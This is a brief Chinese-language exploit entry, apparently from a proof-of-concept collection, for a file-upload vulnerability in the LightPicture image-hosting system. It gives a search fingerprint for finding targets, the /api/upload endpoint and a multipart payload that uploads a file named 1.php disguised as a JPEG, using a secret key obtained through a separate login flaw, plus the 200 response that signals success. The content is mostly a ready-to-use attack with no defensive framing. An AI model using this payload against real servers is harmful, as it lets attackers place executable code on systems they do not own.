# LightPicture图床系统upload存在文件上传漏洞

LightPicture ｜ 文件上传 ｜ —
- **指纹**：`title="LightPicture"`
- **请求**：`POST /api/upload HTTP/1.1`

**Payload**
```
-----------------------------341634313838488804654020562504
Content-Disposition: form-data; name="key"
参考LightPicture 图床系统info存在任意用户登录漏洞填入 Secret_key
-----------------------------341634313838488804654020562504
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
123456
-----------------------------341634313838488804654020562504--
```
- **响应特征**：200